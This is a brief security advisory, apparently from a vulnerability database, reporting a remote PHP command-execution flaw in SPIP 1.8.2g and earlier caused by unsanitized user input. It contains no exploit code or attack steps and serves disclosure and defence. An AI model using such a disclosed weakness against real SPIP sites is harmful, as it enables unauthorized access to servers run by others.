SPIP is prone to a remote command-execution vulnerability. This is due to a lack of proper sanitization of user-supplied input.

An attacker can exploit this issue to execute arbitrary remote PHP commands on an affected computer with the privileges of the webserver process.

Successful exploitation could facilitate unauthorized access; other attacks are also possible.

Version 1.8.2g and earlier are vulnerable; other versions may also be affected.
